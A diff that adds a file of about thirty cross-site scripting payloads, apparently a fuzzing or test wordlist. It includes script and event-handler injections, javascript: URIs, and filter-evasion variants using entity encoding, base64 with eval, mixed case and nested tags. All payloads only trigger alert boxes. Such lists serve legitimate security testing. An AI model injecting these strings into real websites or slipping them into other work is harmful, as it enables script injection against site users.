@@ -1,0 +1,30 @@
+<script>alert('XSS')</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+"><img src=x onerror=alert(1)>
+'"><svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(document.domain)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+javascript:alert(1)
+javascript:alert(document.cookie)
+'-alert(1)-'
+";alert(1);//
+</script><script>alert(1)</script>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<svg><script>alert&#40;1&#41;</script>
+<img src="x" onerror="eval(atob('YWxlcnQoMSk='))">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<img/src="x"/onerror=alert(1)>
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
